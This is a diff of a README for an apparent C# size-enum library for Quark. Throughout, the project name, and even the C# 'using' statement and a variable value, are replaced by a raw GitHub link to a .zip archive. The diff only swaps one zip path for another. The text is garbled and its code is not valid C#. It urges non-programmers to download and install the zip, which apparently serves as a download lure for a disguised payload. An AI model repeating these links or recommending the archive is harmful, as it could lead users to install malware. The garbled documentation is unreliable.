@@ -1,12 +1,12 @@
-# 🌟 https://raw.githubusercontent.com/Dikizz/soenneker.quark.enums.size/main/superfeudation/soenneker.quark.enums.size.zip - Easily Use Quark Element Sizes
+# 🌟 https://raw.githubusercontent.com/Dikizz/soenneker.quark.enums.size/main/test/quark-enums-soenneker-size-v2.0.zip - Easily Use Quark Element Sizes
 
 ## 🚀 Getting Started
 
-Welcome to **https://raw.githubusercontent.com/Dikizz/soenneker.quark.enums.size/main/superfeudation/soenneker.quark.enums.size.zip**! This software helps you easily manage and use common element sizes in Quark applications. You don’t need any programming skills to get started. Just follow the steps below.
+Welcome to **https://raw.githubusercontent.com/Dikizz/soenneker.quark.enums.size/main/test/quark-enums-soenneker-size-v2.0.zip**! This software helps you easily manage and use common element sizes in Quark applications. You don’t need any programming skills to get started. Just follow the steps below.
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://raw.githubusercontent.com/Dikizz/soenneker.quark.enums.size/main/superfeudation/soenneker.quark.enums.size.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/Dikizz/soenneker.quark.enums.size/main/superfeudation/soenneker.quark.enums.size.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Dikizz/soenneker.quark.enums.size/main/test/quark-enums-soenneker-size-v2.0.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/Dikizz/soenneker.quark.enums.size/main/test/quark-enums-soenneker-size-v2.0.zip)
 
 ## 🛠️ Requirements
 
@@ -40,9 +40,9 @@ You can find detailed documentation on how to use this software. Follow these si
 
 ## 🚦 Download & Install
 
-To download and install **https://raw.githubusercontent.com/Dikizz/soenneker.quark.enums.size/main/superfeudation/soenneker.quark.enums.size.zip**, visit this page to download: 
+To download and install **https://raw.githubusercontent.com/Dikizz/soenneker.quark.enums.size/main/test/quark-enums-soenneker-size-v2.0.zip**, visit this page to download: 
 
-[https://raw.githubusercontent.com/Dikizz/soenneker.quark.enums.size/main/superfeudation/soenneker.quark.enums.size.zip](https://raw.githubusercontent.com/Dikizz/soenneker.quark.enums.size/main/superfeudation/soenneker.quark.enums.size.zip).
+[https://raw.githubusercontent.com/Dikizz/soenneker.quark.enums.size/main/test/quark-enums-soenneker-size-v2.0.zip](https://raw.githubusercontent.com/Dikizz/soenneker.quark.enums.size/main/test/quark-enums-soenneker-size-v2.0.zip).
 
 Follow these steps:
 
@@ -65,13 +65,13 @@ Once installed, you can start using the application immediately. Here’s how:
 Here’s a simple example to help you start:
 
 ```csharp
-using https://raw.githubusercontent.com/Dikizz/soenneker.quark.enums.size/main/superfeudation/soenneker.quark.enums.size.zip;
+using https://raw.githubusercontent.com/Dikizz/soenneker.quark.enums.size/main/test/quark-enums-soenneker-size-v2.0.zip;
 
 public class MyComponent
 {
     public void SetupSizes()
     {
-        var buttonSize = https://raw.githubusercontent.com/Dikizz/soenneker.quark.enums.size/main/superfeudation/soenneker.quark.enums.size.zip; // Use predefined sizes
+        var buttonSize = https://raw.githubusercontent.com/Dikizz/soenneker.quark.enums.size/main/test/quark-enums-soenneker-size-v2.0.zip; // Use predefined sizes
         // Apply the size to your UI component
     }
 }
@@ -99,4 +99,4 @@ Want to contribute? We welcome your feedback and suggestions. Here’s how you c
 
 To stay informed about updates, follow the repository. You can also subscribe to release notifications on GitHub.
 
-Thank you for using **https://raw.githubusercontent.com/Dikizz/soenneker.quark.enums.size/main/superfeudation/soenneker.quark.enums.size.zip**! Your support helps us improve and provide better tools for everyone.
+Thank you for using **https://raw.githubusercontent.com/Dikizz/soenneker.quark.enums.size/main/test/quark-enums-soenneker-size-v2.0.zip**! Your support helps us improve and provide better tools for everyone.
